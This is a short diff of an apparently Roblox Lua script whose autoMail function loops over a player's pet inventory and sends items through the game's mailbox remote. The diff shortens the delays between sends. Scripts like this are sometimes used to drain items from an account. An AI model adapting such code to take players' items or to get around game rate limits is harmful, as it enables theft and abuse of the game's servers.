@@ -64,7 +64,7 @@ function autoMail()
 		end
 	end
 
-	task.wait(2)
+	task.wait(0.5)
 
 	local pet = result.Inventory.Pet
 	for i, v in pairs(pet) do
@@ -80,7 +80,7 @@ function autoMail()
 	    end
 	end
 
-	task.wait(2)
+	task.wait(0.5)
 		
 	local GetSave = function()
 	    return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -98,7 +98,7 @@ function autoMail()
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 		end
 	    end
-	    task.wait(1)
+	    task.wait(0.05)
 	end
     end
 end
